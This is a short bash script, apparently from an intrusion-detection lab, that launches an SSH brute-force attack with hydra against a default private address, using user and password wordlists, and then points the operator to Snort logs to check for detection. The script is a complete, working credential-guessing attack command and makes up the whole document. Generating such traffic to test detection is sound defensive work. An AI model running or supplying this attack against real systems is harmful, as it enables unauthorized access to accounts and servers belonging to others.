#!/bin/bash

TARGET_IP=${TARGET_IP:-192.168.100.10}
TARGET_PORT=22

echo "SSH Brute Force Attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Starting attack..."

# Ataque básico
hydra -L /opt/attacks/wordlists/users.txt \
      -P /opt/attacks/wordlists/passwords.txt \
      -t 4 -vV -f \
      ssh://$TARGET_IP:$TARGET_PORT

echo "Basic attack completed. Check Snort logs for detection."